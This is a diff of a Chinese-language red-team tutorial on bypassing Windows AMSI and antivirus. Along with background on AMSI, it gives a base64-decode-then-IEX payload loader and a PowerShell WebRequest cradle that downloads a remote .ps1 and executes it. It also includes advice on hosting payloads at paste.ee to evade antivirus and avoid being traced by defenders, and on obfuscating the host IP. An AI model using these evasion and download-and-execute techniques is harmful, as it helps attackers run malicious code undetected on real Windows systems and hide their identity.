@@ -1,7 +1,14 @@
 # 反病毒引擎AMSI的浅析和绕过
+# AMSI简介
+### 许多进行基于场景的评估或基于数字的红队评估的渗透测试者很可能遇到过 AMSI 并且熟悉它的功能。AMSI 增强了对攻击期间常用的一些现代工具、策略和程序 (TTP) 的使用保护，因为它提高了反恶意软件产品的可见性。最相关的例子是 PowerShell 无文件负载，它已被现实世界的威胁参与者和渗透测试者广泛使用。
 
+### 如前所述，AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。为此，AMSI 正在挂钩，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。 
 
+ 
+### 这是在 Windows 10 上实现 AMSI 的所有组件的列表：
 
+### 用户帐户控制或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）、 PowerShell（脚本、交互式使用和动态代码评估）、Windows 脚本宿主（wscript.exe 和 cscript.exe）、JavaScript 和 VBScript Office VBA 宏  
+### (请注意，AMSI 不仅用于扫描脚本、代码、命令或 cmdlet，还可以用于扫描任何文件、内存或数据流，例如字符串、即时消息、图片或视频。)
 
 # 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
@@ -12,9 +19,7 @@
 
 
 
-
-
-# 注意我这里用的是64位的stageless，所以文件比较大
+# 注意我这里用的是64位的stageless，powershell文件越大，混淆的手法越
 
 
 ![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
@@ -26,8 +31,6 @@
 
 
 
-
-
 # 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
 
 
@@ -35,7 +38,7 @@
 
 
 
-# 这里就是一个常用的base64的解密公式
+# 这里就是一个常用的base64的解密公式，然后用IEX去执行解密后的密文
 
 ``` 
 解密后的变量 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密后的变量)); 
@@ -141,16 +144,18 @@ HRESULT AmsiScanBuffer(
 
 # 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
 
-## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
+## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是在实战攻防中非常容易就被蓝队溯源出个人信息，这边推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
 
 
 ```
+
 $webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
 $resp=$webreq.GetResponse()
 $respstream=$resp.GetResponseStream()
 $reader=[System.IO.StreamReader]::new($respstream)
 $content=$reader.ReadToEnd()
 IEX($content)
+
 ```
 
 ## 我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址
